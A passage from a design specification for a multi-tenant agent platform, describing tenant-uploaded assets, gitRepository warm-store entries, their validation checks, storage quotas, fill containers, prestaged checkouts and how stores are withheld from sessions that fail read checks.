**Uploads.** An uploaded artifact is stored once: the packs it was chunked into at upload are its only copy, and a pod's contribution of the file to the tenant-owned assets set finds its chunks already there. A tenant's stored upload bytes are at most the grant's `maxAssetUploadBytes`, which the operator sets per tenant and which reads `runtimes.tenantDerivation.maxAssetUploadBytes`, 1 GiB by default, when the grant omits it (decision 43), and an upload past it answers `429 STORAGE_QUOTA_EXCEEDED` with `details.currentBytes` and `details.limitBytes`, as an upload past the tenant's storage quota does. An upload that no version of its runtime still in use references, neither the runtime's current `sharedAssets` nor the append of a pod set of its owned pool, is deleted by reference-based garbage collection after a grace period of 7 days, which keeps an upload that a tenant has made and not yet named. Uploads are deleted with their derived runtime and with the tenant. A deletion removes the upload's reference, and the set's garbage collection reclaims each chunk that no other reference holds. `inline` content lives in the derived runtime's row, under the bounds above, and is not billed apart from that row. The packs of the tenant-owned assets set, which hold the uploads and the pods' contributions of `inline` files, are billed to the tenant once per pack ([`0121-billing-resource-attribution`, "Checkpoint packs and platform chunk sets"](../0121-billing-resource-attribution/change.md#storageusage)).

The files are data class Confidential under [TSS-8](../0150-tenant-security-settings/change.md#tss-8-data-classes). Uploaded artifacts are stored only as packs of the runtime's tenant-owned assets set under the tenant's key, deleted with the runtime and with the tenant by §12.8 erasure, and kept while a legal hold covers the tenant. A tenant-derived runtime's `inline` and `artifact` entries form a tenant-owned assets set of the platform chunk sets, which its uploads seed and to which the owned pool's never-launched pods contribute, which only the tenant's sessions of that runtime reference, and which is billed to the tenant ([`0131-incremental-checkpoint`, "Platform chunk sets"](../0131-incremental-checkpoint/change.md#platform-chunk-sets)). Each file is readable from every slot of every pod of the owned pool, and every session on the runtime can read and copy it, so an asset must not hold a secret, which the tenant documentation states. A runtime can load a file under `/lenny/assets` as configuration, so a tenant asset is treated as code, as "Tenant defaults" states for a default file: `derivedRuntimes.forbid: workspaceFiles` also refuses `inline` and `artifact` assets, and `verbatimClientFiles: forbid` therefore refuses them as well.

**`gitRepository` entries.** A tenant's `gitRepository` asset declares a store on the owned pool's warm list, and it is the tenant's only way to warm a repository. It replaces the warm default clone and the cache-only entry of earlier revisions, and it carries the checks those had. Each entry carries `name`, `url`, `ref`, and optional `prestage`, and no `auth`, `path`, `write`, `depth`, or `submodules`. A write naming `path` answers `400 VALIDATION_ERROR` naming the field, because `prestage: true` replaced it (decision 42). Its fill uses the VCS pool that covers the repository. A `platform-admin` who wants a private repository warmed on one tenant's owned pool writes the entry on that tenant-derived runtime through `PUT /v1/admin/derived-runtimes/{name}`, which [SO-4a](../0142-security-oversight/change.md#so-4a-mirror-to-the-tenant-chain) mirrors. The stored entry records its declarer from the role of the writer: `platform` for an entry a `platform-admin` writes, and `tenant` for one a tenant admin writes. An entry that a write leaves unchanged keeps the declarer recorded when it was written. A `POST` or `PUT` refuses an entry with `422 INVALID_DERIVED_RUNTIME` and `details.field` naming it unless all of these hold:

- The grant entry's `maxWarmCloneBytes` is above zero. For a `tenant`-declared entry, the grant entry also sets `allowGitClones`, DR-3 has landed, as "A clone is code" requires of a default clone, and the runtime's default clones and `tenant`-declared `gitRepository` assets together are within the grant entry's `maxDefaultGitClones`.
- `name` is unique among the runtime's `gitRepository` assets and is a valid label value, and no two of them name one normalized URL.
- `url` passes §14's restrictions and the shared canonicalizer, and it carries no userinfo.
- The host is the host of one of the tenant's VCS pools or git routes, and it lies within the owned pool's ceiling.
- A repository under a VCS pool's prefix is on the tenant's repository allowlist.
- `ref` is a well-formed ref name or a full commit, and it cannot begin with `-`, because `lenny-store-fill` passes it to git.
- The owned pool has a git path.
- The repository lies under no VCS pool prefix of the tenant, or credential selection with no environment (E = ∅) resolves it to a VCS pool with no `environments` list whose allowlist names it, as "Scoped repositories" under "Warm stores" states. A pod with no session has no environment, so both the mirror route and the direct route ask the Token Service with E = ∅, and the Token Service refuses a pool that E = ∅ cannot see. Without this check the fill would fail on every pod and the runtime would serve no session.
- A repository under a VCS pool with `userAuthorization: required` needs an owned pool that does not reuse pods, as "One session per pod" states.

`derivedRuntimes.forbid: gitClones` also refuses `tenant`-declared `gitRepository` assets. A `gitRepository` asset adds no source to any session's plan: its store serves only a `gitClone` source that a default clone or the client's plan already holds, and a prestaged tree that no such source adopts is discarded. A `tenant`-declared asset still needs `allowGitClones` and DR-3, as the cache-only entry it replaces did, because its tree is staged in each idle slot's workspace and a session adopts it as the checkout of its repository.

**Platform-declared assets.** A `gitRepository` asset that a `platform-admin` writes keeps the protections that decision 35 gives an operator's entry, because the tenant cannot fix its cause. A pod whose fill it failed counts in no term of the tenant's charge T ("Bounds"), its failure alerts the operator, `GET` reports it to the tenant admin as `blockedBy: platformEntry`, and a host the tenant denies suspends it with the reason `tenantDenied` in place of failing the tenant's pods ("Reach before binding"). It does not count toward `maxDefaultGitClones`, the tenant's `derivedRuntimes.forbid: gitClones` does not refuse it, and it needs neither `allowGitClones` nor DR-3, because each of those bounds the tenant's own input. Every other check above applies to it, and the read checks of "Who reaches a store" run on it as on a `tenant`-declared asset, because its store is private to the owner's pool, as decision 39 read-checked a private platform entry. A tenant's `PUT` cannot remove or change it. `GET` lists such an asset with `declarer: platform`, and a body that carries it unchanged, every field equal to the stored entry's and `declarer` absent or `platform`, is accepted, so a tenant can write back what it read (decision 43). A body that names one, by its `name` or its URL, with any field changed answers `422 INVALID_DERIVED_RUNTIME` with `details.field`, and a body that leaves it out keeps it as stored, because the tenant cannot remove it. Only a `platform-admin`'s write changes or removes it.

#### Warm stores

A `gitRepository` entry of `sharedAssets` fills a store on each of the pool's pods before any session, so any `gitClone` source of that repository later fetches only the difference between the store's commit and the commit it binds. The store is fetched once per pod and shared read-only by every slot on that pod. It holds objects, and under the reflink rebuild one pristine checked-out tree. Each session's working tree is its own: with `prestage: true` the warm-up checkout stages the repository's tree in each idle slot's workspace at warm-up and after each slot release, and at bind `lenny-materialize` adopts that tree for the first source that the store serves, so setup commands still run per session. A store changes only where the bytes come from: every check under "Binding" runs as it does without it, and the session's commit is still resolved at bind.

**Warm list.** Every pre-filled repository store on a pod comes from one warm list that the PoolScalingController renders for the pool, and, once [`0140-runtime-revisions`](../0140-runtime-revisions/change.md) lands, for each pool and pod set, onto that pod set's `PodSet` ([RV-3](../0140-runtime-revisions/change.md#rv-3-pods)). The base's public entries come from the revision's `sharedAssets`, and the derived runtime's `gitRepository` assets are part of its contribution to the pod-set key. A pod warming for one revision therefore reaches only that revision's entries. One rule set, the one this section states, governs every entry whoever declared it (decision 31). Each rendered entry records the normalized repository URL, the ref, which is a branch, a tag, or a full commit, the store directory, named by a hash of that URL, the declarer, `platform` or `tenant`, and `prestage`, which is true when the warm-up checkout stages the repository in each idle slot. Entries come from these declarers (decisions 32 and 42):

- **The operator, on a base.** A public `gitRepository` entry on a Runtime's `sharedAssets` goes onto the warm list of every pool of that runtime, the owned pools of runtimes derived from it included. `sharedAssets` is versioned, so the entry reaches the pod sets of the revisions that carry it. Operator entries on a Runtime are public only, so a Runtime write whose entry carries `auth` is refused. No entry adds a source to a session's plan. An entry may carry `prestage: true`, and the warm-up checkout then stages the repository in each idle slot, as "Warm-up checkout and reflink rebuild" states. The owner settled staging on platform pools on 2026-11-13 as option (a) of the question of what a platform pool stages, with a target `path`, and replaced the `path` with `prestage: true` on 2026-11-14 (decision 42). An entry carries no path field, so `prestage` is unrelated to the `destPath` that draft 0111 gave an entry for the store's location, which stays dropped.
- **The tenant-derived runtime.** Its `gitRepository` assets, under "Tenant shared assets", each with the declarer recorded from the role that wrote it: `tenant` for a tenant admin's asset, and `platform` for a `platform-admin`'s private entry for that one tenant, which keeps decision 35's protections under "Platform-declared assets". The `warmRepositories` field on an owned pool's row and the `pool.warmCaches` field of earlier revisions are gone, because a store comes only from `sharedAssets` (decision 42). A pool write naming `warmRepositories`, a derived-runtime write naming `pool.warmCaches`, a runtime write naming `workspaceDefaults.gitClones[].warm`, and a write naming a `gitRepository` entry's `path` each answer `400 VALIDATION_ERROR` naming the field, under the rule for removed fields of [`0140-runtime-revisions` D27](../0140-runtime-revisions/decisions.md#decisions).

Entries naming one normalized URL share one store on the pod, which is filled once. The runtime's own entry's ref wins over the base's entry's, and a runtime holds at most one entry per URL among its `gitRepository` assets. The store's declarer is `tenant` when either entry is `tenant`-declared and `platform` otherwise, and the store is staged when either entry carries `prestage: true`. A store serves a source at another commit through a larger delta, because git is content-addressed. One URL that a base's public entry and a `gitRepository` asset of the runtime both declare is still two sources of the platform chunk sets of [IC-4](../0131-incremental-checkpoint/change.md#platform-chunk-sets), and the trees the warm-up checkout stages from their shared store always feed the tenant-owned set of that URL, whichever entry carries `prestage: true`. A `platform`-declared asset's store feeds the tenant-owned set as well, because it serves the owner alone, its fill runs on the tenant's identity, and its content is a repository private to that tenant, which [TSS-8](../0150-tenant-security-settings/change.md#tss-8-data-classes) keeps under the tenant key. Only a store that a base's public entry alone declares feeds the platform-owned set. Decisions 23 to 27 apply to an operator's store as they do to a tenant's, and the age limit stays unset by default on platform pools, as "Age" states.

**Carrier.** The PoolScalingController renders the warm list on `PodSet.spec.warmClones` for every pool, from the public `gitRepository` entries of the revision's `sharedAssets`, which for an owned pool are the base's, and, on an owned pool, from the derived runtime's `gitRepository` assets. That one carrier serves platform pools and owned pools, so the base's entries no longer reach the adapter through `encodeSharedAssets`. The owned pool row copies `maxWarmCloneBytes` from the grant entry, and the `PodSet` carries the pool's store bytes as `warmCloneBytes`, as "Size" states. `createPod` encodes the list onto the flags of `lenny-store-fill` and the adapter, and it records the store directories on the `AgentPod` as `warmStores`. The WarmPoolController also stamps a new `lenny.dev/owner-tenant` label on the `AgentPod`, which is what the creation rule under "Bounds" lists by, because `agentPodLabels` holds no owner today and the tenant pin label also appears on a shared pool's pods. A derived runtime has no `Runtime` resource, and `encodeSharedAssets` reads that resource, so 0111's carrier cannot serve here. A CRD field pattern refuses userinfo in the URL as a second gate, as 0111 states for its own field.

**Fill.** Before the pod reports ready, the `lenny-store-fill` init container fills a new bare repository for each store on the list, whoever declared its entry, on a dedicated `emptyDir`, `lenny-git-stores`, which it mounts read-write and every slot container mounts read-only at `/lenny/git-stores` ([PL-3](../0118-agent-pod-layout/change.md#pl-3-runtime-visible-filesystem-layout)). The owner settled the container on 2026-11-13 as decision 61 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), in the words "if the separate container works from a permissions standpoint, then yes", so the fill keeps [WM-9](../0153-workspace-materialization/change.md#wm-9-archive-extraction-leaves-the-gateway)'s rule that no platform-privileged process parses untrusted content, with no exception. The container runs after the `netagent` native sidecar has started, under its own UID, which maps inside the pod's UID range under user namespaces, with no service account token and no credential volume, and with the pinned git from `lenny-bin` mounted read-only and exec-only. It fills the stores and writes each pristine tree of the reflink rebuild, then exits before the adapter and the slot containers start. `netagent` attributes the container's connections to the platform fill by its UID and applies the fill's authorization, so the fill fetches through `netagent` on the session git path with the identity stated below. The adapter mounts the same volume read-write at `/adapter/git-stores` for one purpose, the deletion of a withheld store under "Withheld stores", and it never parses repository data. The fill works on stores, which no slot can write, so it is not git on a slot repository, which [SI O11](../0145-session-isolation/decisions.md#open-decisions) keeps out of the adapter. `lenny-store-fill` writes with the store group, the dedicated store GID of [PL-5](../0118-agent-pod-layout/change.md#pl-5-volumes-size-limits-and-eviction), which is the primary group of both `lenny-store-fill` and the adapter and of no other container, as the file group and a umask of `0002`, so the stores' directories are mode `0775` and their object files `0444`, and after each pristine tree's checkout it runs an explicit mode pass that sets the tree's directories to `0775`, its files to `0444`, and its executables to `0555`, whatever modes git's checkout wrote, and clears every setuid and setgid bit. Nothing grants write to the other class, every slot reads them through the other class ([SI-8](../0145-session-isolation/change.md#si-8-shared-repository-stores)), no slot container holds the store group, and the adapter, whose primary group it is, deletes a withheld store and its pristine tree through the group class. Every agent-pod container runs with `allowPrivilegeEscalation: false`, so a setuid or setgid bit in a repository has no effect even before the mode pass clears it. On a Kata `block-plain` pool, whose volume root carries the setgid bit and the dedicated volume GID, `lenny-store-fill` sets each store's directory and its pristine tree's directory to the store group before it writes into them, as PL-5 states. The owner accepted this hardening on 2026-11-13 under decision 61 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), in the words "ok but add an owed item to stress test this thoroughly (with actual tests)". A bare store records no absolute path, so it serves alternates at `/lenny/git-stores` in the slots whatever path the fill wrote it at. The fill ignores hooks and repository configuration. On an owned pool the owner's label is on the pod from creation, so the fill runs as the tenant. On a shared pool the pod has no tenant, and a public entry fills anonymously through the mirror's public store or `direct`, as the egress design states for a warm fill. The store records its commit, resolved from a floating ref or fetched by SHA for a full one, as its only ref, because git offers the ref tips of an alternate, an object store a repository borrows objects from through `objects/info/alternates`, as haves. The store is immutable from then on. Whether these permissions hold on every runtime class, and whether the container's 1 GiB memory limit holds for the largest store and pristine tree a pool's `warmCloneBytes` admits, is owed to validation, as the egress design's decision 61 lists, together with the hostile-repository stress suite the owner asked for, run as tests on runc, gVisor, and Kata.

- **Size.** The volume's `sizeLimit` is `warmCloneBytes`, and the pod's ephemeral-storage request includes that value, because the controller renders the request as the sum of the `sizeLimit`s of the pod's disk-backed volumes plus the resource class's own request ([PL-5](../0118-agent-pod-layout/change.md#pl-5-volumes-size-limits-and-eviction)). The scheduler and the quota then count it. `lenny-store-fill` ends a fill that passes the limit, `sizeLimit` is the second line, and a breach evicts this pod alone. Every store is sized, whoever declared it. On a platform pool a platform admin sets `warmCloneBytes` on the pool row. On an owned pool it is the template's value, which covers the base's entries, plus the grant entry's `maxWarmCloneBytes`, which covers the runtime's `gitRepository` assets. Both figures count each store together with its pristine tree under the reflink rebuild, which `lenny-store-fill` writes on the same volume. Neither a tenant's input nor an operator's can leave node storage unsized.
- **Share of the quota.** Every agent pod requests ephemeral storage equal to the sum of its disk-backed volumes' `sizeLimit` values ([PL-5](../0118-agent-pod-layout/change.md#pl-5-volumes-size-limits-and-eviction), decision D3 of [`0131-incremental-checkpoint`](../0131-incremental-checkpoint/decisions.md#decisions)) plus its resource class's own `requests.ephemeral-storage`, 1 GiB in the shipped classes and set per class ([decision 18 of `0121-billing-resource-attribution`](../0121-billing-resource-attribution/decisions.md#decisions), settled on 2026-11-13 as option (a) of BR-Q1), so every pod counts against `lenny-agent-storage-quota`, and a warm list adds its `warmCloneBytes` to that request. The warm stores are the part a grant controls, and one grant could use the quota and leave other tenants' pods refused. A grant write that raises the sum across grants of `maxOwnedPods` times the entry's largest `maxWarmCloneBytes`, plus that entry's template `warmCloneBytes`, is refused above `warmClones.totalBytes`, under the grant lock, and preflight compares that total, together with the other disk-backed volumes every pool's pods request, with the storage quota. Any other grant write passes, including an emergency `retireAt`, so a lowered Helm value blocks only raises, and `GET` reports the excess. A template write that raises `warmCloneBytes` succeeds under DP9, and `GET` reports that excess as well. Pods created before a lowering hold their requests until they end. A reservation does not hold against storage, as DR-10 states.
- **Checkout.** A commit the store holds causes no fetch, so the fetch cap does not bound what a checkout writes, and a small pack can expand far past its size, because a tree can reuse subtrees. Before every checkout, `lenny-materialize` streams the tree's listing under a git directory of its own, as the slot UID, and it stops at the first of `workspaceSizeLimitBytes`, `adapter.maxCloneTreeEntries`, or the run's deadline with the slot-reported reason `git_tree_limit`, which the adapter maps to `UPLOAD_ARCHIVE_LIMIT_EXCEEDED` ([WM-10](../0153-workspace-materialization/change.md#wm-10-git)). Each entry is charged as 0111's rule 2 charges it, each blob rounded up to 4,096 bytes plus 128 bytes per entry, and the total runs across the plan's clones, so empty files and repeated subtrees count, and several clones cannot sum past the limit. A clone without a store runs this after its fetch, which the fetch cap bounds. This takes the place of 0111's rule 2 bound, which ran in the gateway's mirror. The helper's result is slot-reported, so the adapter's per-slot disk watch, which fails the slot's session at `adapter.diskWatchThresholdPercent` of the workspace volume's `sizeLimit`, 90% by default, is the backstop, and the volume's `sizeLimit` is the last line ([SI-10](../0145-session-isolation/change.md#si-10-what-stays-shared)). The warm-up checkout runs the same check against the empty slot's bytes. A `prestage` run whose check stops an entry, or that reaches the pod's prestage timeout, the runtime's `prestageTimeoutSeconds` or, without one, the pool's value or `adapter.prestageTimeoutSeconds`, skips that entry in that slot, and the slot still reports ready: a session that clones the repository there builds it from the store, as [WM-15](../0153-workspace-materialization/change.md#wm-15-warm-up-checkout-and-reflink-rebuild) states, and the skip is counted in `lenny_prestage_skipped_total` and reported as a `PrestageSkipped` event on the `AgentPod`. A runtime write, a tenant's or an operator's, answers with a `Warning` when the staged trees of its entries with `prestage: true`, as the latest `prestage` runs on its pools measured them, together exceed half of `workspaceSizeLimitBytes`, because each staged tree counts against every idle slot's volume, and a session that does not adopt it keeps its bytes until the background deletion ends.
- **Reach before binding.** The decision service and the Token Service read the warm list from the pool row, and, once revisions land, for the pod's pool and revision. While a pod has no session, its readable set is the warm list of its pool and revision plus the repositories of the warm-up policy that applies to it, which is the pool's warm-up policy on an unbound pod and the tenant's warm-up additions on a tenant-bound pod. Its tokens are read tokens alone, whatever `userAuthorization` says, and a repository off the tenant's allowlist has already left the rendered list. The hosts of every entry join the pod's pre-session policy within the ceiling, and a tenant deny still wins. A tenant entry under a host the tenant denies fails its fill, which is reported. A platform-declared entry, a base's public entry or a `platform`-declared asset, whose host the owning tenant denies is left off that owned pool's rendered list and reported as suspended with the reason `tenantDenied`, so the tenant's own policy never fails its pods on an operator's entry. On a VCS pool with `userAuthorization: required`, the fill uses the App, as [`0152-user-git-identity`, "Mirror, warm fills, and the 6-hour promise"](../0152-user-git-identity/change.md#mirror-warm-fills-and-the-6-hour-promise) states. Repositories on providers whose capability level is `mint-coarse` or `stored` skip the mirror under the [egress design](../0127-egress-and-git/change.md)'s routing rule, so each pod fetches them from the host.
- **Failure.** A fill that fails takes the pod to `failed`, as 0111 states, with no fallback to a ready pod lacking its store. `lenny-store-fill` stops at the first store whose fill fails and names it in its termination message, and the AgentPod controller records that store's directory and its entry's declarer in `fillFailure`, so a pod has one cause. After `warmClones.failureThreshold` consecutive failures of one store, whoever declared its entry, the WarmPoolController backs off creating that pool's pods while that store is on the list, doubling up to 10 minutes, and sets `WarmCloneFillFailing` with the declarer as a label. The backoff applies on platform pools and owned pools alike. `GET` reports `warm.state` and `blockedBy` with a reason to the tenant admin: `gitRepositoryAsset` with the `name` of a `tenant`-declared asset, or `platformEntry` with the URL of the base's public entry or the `name` of a `platform`-declared asset. An alert for a platform-declared entry goes to the operator, and a `TenantReservationUnmet` that such an entry causes names that cause. A pod that a platform-declared entry failed counts in no term of T, as "Bounds" states (decision 35). The backoff is keyed by store directory, so removing the failing `gitRepository` asset is the immediate way out, and a loop of writes cannot reset it.
- **Shared capacity.** The WarmPoolController creates no `AgentPod` with a warm list while the owner has `warmClones.maxConcurrentFillsPerTenant` pods running a fill, which leaves out a Pending pod, so that another tenant's burst at the quota cannot hold this limit, so one tenant's fills do not take over `lenny-egress`. Under decision 38, a pod on an owned pool that fills only platform-declared entries counts toward this limit, because its fill runs on the tenant's egress identity. A shared pool has no tenant to key the limit on, and the rewrite of 0111 states its fill concurrency. `controller.tuning.gitStoreFillTimeout` bounds each fill.

**Warm-up checkout and reflink rebuild.** The owner approved both on 2026-11-12, and [`0153-workspace-materialization`](../0153-workspace-materialization/change.md) owns their mechanics. This section states how they meet the warm list **[design]**:

- **What is staged.** Every rendered entry that carries `prestage: true`, from the revision the pod's template names, whoever declared it: on every pool the operator's public entries, and on an owned pool the runtime's `gitRepository` assets as well (decision 42). An entry without `prestage` fills a store and stages nothing. A staged tree adds no source to a session's plan: a session adopts it only when its workspace clones that repository.
- **When and how.** At warm-up and after every slot release, the adapter asks the supervisor of each idle slot to run `lenny-materialize` as the slot UID, which checks each such entry out of its store into `/workspace/.lenny-prestage/<entry>` with the steps a session's materialization runs, including the tree-size check, and refreshes the index more than 1 s after the checkout. No runtime process runs in an idle slot, because every runtime launches at bind.
- **At bind.** The first `gitClone` source of the session's workspace, in the composed order of the defaults and then the plan, whose URL the entry's store serves and that a store may serve, which leaves out a source with `depth` or `submodules: true`, adopts the staged tree by renaming it to that source's `path`. A source in the plan has passed its read checks or refused the session, so a session adopts only a tree of a repository it may read, and a tree staged from a store withheld for the session is removed before anything runs, as "Withheld stores" states. When the session's resolved commit differs from the staged one, the helper checks the commit out in place. When the target already holds files, such as a default file written earlier, the existing per-path collision rule applies, as it does for a clone. A second source of the same URL in one workspace clones from the store. A staged tree that no source adopts, such as one for a session that does not clone the repository, is renamed aside and deleted in the background, and checkpoints skip the reserved names. [WM-15](../0153-workspace-materialization/change.md#wm-15-warm-up-checkout-and-reflink-rebuild) states the adoption steps.
- **Why the entry names no path.** The owner asked, on 2026-11-14: "does prestage need a path? Can't the path be determined at the time of copying (based on workspaceDefaults and the session plan)?" It does not. The adoption is a rename within the slot's workspace volume, so the files keep their inode numbers and modification times and the index the warm-up checkout refreshed stays valid at the new path, and nothing in a staged tree records its own location: its alternates name the store by its absolute path under `/lenny/git-stores`. The target folder is therefore read from the composed workspace at bind.
- **Reflink rebuild.** The store volume also holds one pristine checked-out tree per store that serves a staged entry, which `lenny-store-fill` writes with the store. Where the filesystem supports reflinks (runc on XFS or btrfs), the helper creates the slot's files as the slot UID and clones their content from the pristine tree with `FICLONE`, so each slot's copy is copy-on-write and independent. On gVisor and Kata it falls back to a normal checkout.
- **Reach.** Staging reads only stores already on the pod, so it adds no fetch and nothing a slot could not already read. The read checks of "Who reaches a store" still run at bind, and a staged tree from a store withheld for the session is removed before anything runs for the session, as "Withheld stores" states.

**Scoped repositories.** A warm-list entry of either declarer is refused at write unless its repository lies under no VCS pool prefix of the tenant, or credential selection with no environment (E = ∅) resolves it to a VCS pool with no `environments` list whose allowlist names it (decision 36). A write of a `gitRepository` asset on a tenant-derived runtime, by a tenant admin or a platform admin, answers `422 INVALID_DERIVED_RUNTIME`. A public entry on a Runtime reaches the owned pools of several tenants, and refusing the Runtime write over one tenant's VCS pool would let a tenant block a platform write, against R6. That write therefore passes with a `Warning` naming the owned pools on which the entry renders suspended. A later VCS pool write that makes an entry fail the predicate, such as one that adds `environments` to the covering pool or deletes or narrows a tenant-wide pool that covered it, is never refused for that reason. It passes with a `Warning` naming each runtime and entry it affects. The PoolScalingController applies the same predicate against the current pools at each render, so the entry leaves the rendered list, and `GET` reports it as suspended with the reason `environmentScoped`. A default clone of that repository stays on the runtime and materializes cold for the sessions that pass its checks. "Changing the list" then drains idle pods holding the store, and `coveredStores` refuses such pods at the next claim. The entry returns to the list once the predicate holds again, such as when the pool is unscoped. A repository removed from the allowlist has already left the rendered list.

**Session.** Materialization follows 0111's rule 3, as [`0127-egress-and-git`](../0127-egress-and-git/change.md) rewrites its transport and [WM-10](../0153-workspace-materialization/change.md#wm-10-git) places it in `lenny-materialize`. The helper runs, as the slot UID with the pinned git, `git init` in a new directory, writes the store's objects directory under `/lenny/git-stores` to `objects/info/alternates` as an absolute path, fetches `resolvedCommitSha` through `netagent` unless it is already reachable, checks it out detached, and moves the result under "Not verified" below, or adopts a staged tree under "Warm-up checkout and reflink rebuild". The adapter runs no git on the slot repository. Before a helper run that may fetch, the adapter registers a fetch grant with `netagent` naming the slot, the URLs, and a window ending at the run's deadline, so `netagent` treats the helper's fetch as materialization rather than as the session's own ([WM-10](../0153-workspace-materialization/change.md#wm-10-git)), and [`0127-egress-and-git`, "Slot attribution and fetch grants"](../0127-egress-and-git/change.md#slot-attribution-and-fetch-grants) owns the grant and its carrier. A store serves any `gitClone` source in the plan whose normalized URL equals the store's, whoever wrote the source, whether a client, an operator's or a tenant's default clone, or a derive's copy, unless the source sets `depth` or `submodules: true` (decisions 33 and 42). The adapter decides this from the stores the pod holds and names the store in the helper plan. Serving a client's source reads nothing new, because every store on a pod is readable from every slot, and a session holds a pod only after passing the read checks of every tenant store on it or with that store withheld. A restore covers it as well: a derive copies the stored plan, so a client's source is in the new session's plan as a default clone is, and restore completion fetches the plan's repositories, as "Restore" states. A new session on a pod with no store for the URL fetches that commit shallow, as 0111's fallback does, with no alternates. A store changes where the bytes come from, and a tree from a shallow fetch has no history before its commit, which `depth` already allows a client to choose. A commit the store already holds needs no network, so `netagent` sees no request for it, and the bind checks are the only gate on that read. That is why the host, prefix, and repository authorization checks run at bind on every path, including for a full commit.

**Who reaches a store.** At create, and on every other path that claims a pod, the gateway runs the read checks on every tenant entry of the final pool's warm list for the chosen revision, whether or not the plan names the repository, as "Binding" states (decision 34). In this section and under "Binding", a tenant entry means every `gitRepository` asset of the tenant-derived runtime, a `platform`-declared one included, because each is private to the owner's pool. A `gitClone` source of the composed plan that names an entry's repository covers it, because that source's own checks are the repository's read checks. The gateway runs the read checks for each entry whose repository the plan does not name, which on a resume, retry, rebuild, or derive includes an entry added after the session bound. The checks are those a `gitClone` source of that repository gets: the environment's visibility and denies, the allowlist, and under `userAuthorization: required` the user's own access, which [`0152-user-git-identity`, "Mirror, warm fills, and the 6-hour promise"](../0152-user-git-identity/change.md#mirror-warm-fills-and-the-6-hour-promise) already demands for a private warm fill. Each claim request carries `coveredStores`, the store directories of every such entry whose checks passed, plus the stores of the pool's public platform entries, which every session may read. It also carries `withheldStores`, the store directories of the entries whose checks failed and that "Withheld stores" withholds. On a path that claims in a later call, such as `MaterializeDelegatedChild`, the checks run against the target pool's list at that call. A pod whose `warmStores` lie outside the two lists together is refused, inside the row lock on the Postgres-backed fallback, so a change between the checks and the claim cannot put a session on a store it was not checked for. A plan source whose checks fail refuses the session, as "Whose credential" states for a default clone, because the session needs its files. A pod claimed at create stays with its session through finalize, because the create's checks covered what it holds. The store is readable from every slot on the pod with its whole history up to its commit, which the read scope already covers.

**Stored with the session.** The gateway writes the claim's `coveredStores` and `withheldStores` on the session row in the transaction that assigns the session to its pod, and a later claim of the same session, such as a resume onto another pod, replaces both with the sets that claim checked. A path that places a session with no claim check, `ClaimSlot`'s first pass or `rebindReserved`, still runs the read checks and stores the sets they produce, so every session row carries its own. The stored `coveredStores` decides which platform chunk sets the session's snapshots and output files may reference: at every checkpoint, export, and resume, the gateway computes the session's eligible sources from it and from the session's runtime revision, as [`0131-incremental-checkpoint`, "Platform chunk sets"](../0131-incremental-checkpoint/change.md#platform-chunk-sets) states under decision D1, which the owner settled on 2026-11-13. A store in `withheldStores` is never eligible, because its repository is one the session's user cannot read, and a store the pod holds outside the stored `coveredStores`, which a reused pod can hold under "Reused pods", is not eligible either. The adapter's word never decides eligibility. The row reaches no client: `GET /v1/sessions/{id}` reports `withheldWarmEntries` without URLs, as below.

**Withheld stores.** An entry whose repository the session's plan does not name offers objects that the session does not need, so a failed read check on one withholds its store for that session and does not refuse the session (decision 34). The gateway passes `withheldStores` on the call that assigns the session to the pod, `FinalizeWorkspace` or Resume. Every path makes that call, `ClaimSlot`'s first pass and `rebindReserved` included, so withholding reaches those paths where `coveredStores` does not. Before the adapter materializes anything, runs restore completion, runs a setup command, or starts the runtime, it deletes each listed store directory from `lenny-git-stores` through `/adapter/git-stores`, together with that store's pristine tree under the reflink rebuild, and the `AgentPod`'s `warmStores` drops it. The deletion uses `openat2` and `unlinkat` relative to directory descriptors under `RESOLVE_NO_SYMLINKS | RESOLVE_BENEATH | RESOLVE_NO_XDEV`, so it follows no symbolic link, and the adapter reads no repository data and never the pristine tree. Its first helper run for the session then removes any tree staged from that store under `/workspace/.lenny-prestage/` before it writes anything else. The slot container's read-only mount at `/lenny/git-stores` is the same `emptyDir`, so the deletion is visible there at once. Kubernetes cannot change a running pod's mounts, so deletion is the only way to withhold a store, and nothing refills it on that pod. The WarmPoolController therefore drains the pod when the session ends, in place of returning it to idle or to a reserved hold. The deletion runs before restore completion, so 0111's rule 6 finds no store for that URL and deletes the alternates file of any restored repository that names it.

The session response and `GET /v1/sessions/{id}` list `withheldWarmEntries`, each with the entry's `name` and a reason: `environment`, `userAccess`, `userLinkRequired`, or `providerUnavailable`. The list omits the URL, for the reason "Whose credential" gives: a tenant admin named the repository, and the client did not. The tenant admin's `GET` on the runtime reports, for each entry, the count of sessions that withheld it. Each withholding writes a `warm_store.withheld` record carrying the session, the entry, and the reason. Posture does not change, because withholding narrows access.

These pods refuse the session instead of withholding:

- **Pods with concurrent sessions.** Deleting a store would break the slot repositories of the pod's other sessions, which borrow objects from it, and every slot container mounts the same store volume, so a store cannot be withheld from one slot, which [SI O10](../0145-session-isolation/decisions.md#open-decisions) keeps. A failed check on a pod with `maxConcurrentSessionsPerPod` above 1 therefore refuses the session, and the adapter refuses an assignment that carries a withhold list onto a pod that already has a session. Every warm-list entry passes the environment rule at E = ∅. A concurrent owned pool refuses a tenant entry under `userAuthorization: required` at write, and the render leaves off such a pool a platform entry under a VCS pool with `userAuthorization: required`, so no per-user, link, or provider check runs there. Where `netagent` cannot attribute a connection to its slot, such a pod evaluates every session at E = ∅ and refuses a session whose environment has denies, routes, or objects of its own ([`0149-tenant-scoping-identity`, "Effective policy"](../0149-tenant-scoping-identity/change.md#effective-policy)), so no read check fails there. Where attribution holds, under decision 60 of [`0127-egress-and-git`](../0127-egress-and-git/decisions.md#decisions), a session evaluates with its own environment, and an environment that denies an entry's host fails that entry's read check. That case is reachable, and the session is refused with `ENVIRONMENT_POLICY_NOT_ENFORCEABLE` naming the entry by its `name`, without its URL, as decision 41 settles. [`0149-tenant-scoping-identity`](../0149-tenant-scoping-identity/change.md) and the egress design's "Facts the pages state" list this case under that code. A tenant whose users meet it gives the environment a derived runtime with `oneSessionPerPod: true`, on which the store is withheld instead.

"Residual risks" states what a deletion leaves on the node's disk.

